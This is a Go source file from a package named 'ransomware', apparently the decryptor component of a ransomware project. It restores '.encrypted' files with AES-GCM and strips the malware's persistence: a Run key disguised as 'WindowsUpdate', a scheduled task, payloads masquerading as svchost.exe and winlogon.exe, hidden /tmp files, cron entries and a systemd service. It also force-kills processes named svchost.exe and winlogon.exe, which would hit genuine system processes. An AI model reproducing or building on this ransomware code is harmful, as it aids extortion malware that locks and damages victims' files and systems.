package ransomware

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

var isWindowsDecrypt = runtime.GOOS == "windows"

func DecryptSystem() {
	fmt.Println("[*] Starting system decryption...")

	key, err := loadDecryptionKey()
	if err != nil {
		fmt.Printf("[!] Failed to load decryption key: %v\n", err)
		return
	}

	fmt.Println("[+] Decryption key loaded")

	decryptAllFiles(key)

	removePersistence()

	killRansomwareProcesses()

	cleanupFiles()

	fmt.Println("[✓] System decryption complete!")
	fmt.Println("[✓] All files have been restored")
	fmt.Println("[✓] Malware removed from system")
}

func loadDecryptionKey() ([]byte, error) {
	if len(os.Args) > 1 {
		keyHex := os.Args[1]
		return hex.DecodeString(keyHex)
	}

	keyFile := getKeyFilePath()
	data, err := os.ReadFile(keyFile)
	if err != nil {
		return nil, fmt.Errorf("key not provided and key file not found")
	}

	keyHex := strings.TrimSpace(string(data))
	return hex.DecodeString(keyHex)
}

func getKeyFilePath() string {
	return victimDecryptionKeyPath()
}

func decryptAllFiles(key []byte) {
	var rootPaths []string

	if isWindowsDecrypt {
		for _, drive := range []string{"C:", "D:", "E:", "F:"} {
			if _, err := os.Stat(drive + "\\"); err == nil {
				rootPaths = append(rootPaths, drive+"\\")
			}
		}
	} else {
		rootPaths = []string{"/home/", "/root/", "/opt/", "/srv/"}
	}

	count := 0

	for _, rootPath := range rootPaths {
		filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if info.IsDir() {
				return nil
			}

			if strings.HasSuffix(path, ".encrypted") {
				if decryptFile(path, key) {
					count++
					if count%100 == 0 {
						fmt.Printf("[*] Decrypted %d files...\n", count)
					}
				}
			}

			return nil
		})
	}

	fmt.Printf("[+] Total files decrypted: %d\n", count)
}

func decryptFile(path string, key []byte) bool {
	encrypted, err := os.ReadFile(path)
	if err != nil {
		return false
	}

	decrypted, err := decryptData(encrypted, key)
	if err != nil {
		return false
	}

	originalPath := strings.TrimSuffix(path, ".encrypted")

	err = os.WriteFile(originalPath, decrypted, 0644)
	if err != nil {
		return false
	}

	os.Remove(path)

	return true
}

func decryptData(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func removePersistence() {
	fmt.Println("[*] Removing persistence mechanisms...")

	if isWindowsDecrypt {
		removePersistenceWindows()
	} else {
		removePersistenceLinux()
	}

	fmt.Println("[+] Persistence removed")
}

func removePersistenceWindows() {
	exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", "WindowsUpdate", "/f").Run()

	exec.Command("schtasks", "/delete", "/tn", "SystemMaintenance", "/f").Run()

	malwareLocations := []string{
		os.Getenv("APPDATA") + "\\Microsoft\\Windows\\svchost.exe",
		os.Getenv("TEMP") + "\\winlogon.exe",
		"C:\\ProgramData\\system32.exe",
	}

	for _, path := range malwareLocations {
		os.Remove(path)
	}
}

func removePersistenceLinux() {
	malwareLocations := []string{
		"/tmp/.systemd",
		"/var/tmp/.update",
	}

	for _, path := range malwareLocations {
		os.Remove(path)
	}

	exec.Command("sh", "-c", "crontab -l | grep -v '.systemd' | grep -v '.update' | crontab -").Run()

	exec.Command("systemctl", "disable", "malware.service").Run()
	exec.Command("rm", "-f", "/etc/systemd/system/malware.service").Run()
}

func killRansomwareProcesses() {
	fmt.Println("[*] Stopping ransomware processes...")

	if isWindowsDecrypt {
		exec.Command("taskkill", "/F", "/IM", "svchost.exe").Run()
		exec.Command("taskkill", "/F", "/IM", "winlogon.exe").Run()
		exec.Command("taskkill", "/F", "/IM", "system32.exe").Run()
	} else {
		exec.Command("pkill", "-f", ".systemd").Run()
		exec.Command("pkill", "-f", ".update").Run()
	}

	fmt.Println("[+] Processes stopped")
}

func cleanupFiles() {
	fmt.Println("[*] Cleaning up temporary files...")

	if isWindowsDecrypt {
		os.Remove(os.Getenv("APPDATA") + "\\deadline.dat")
	} else {
		os.Remove("/tmp/.deadline")
	}

	fmt.Println("[+] Cleanup complete")
}
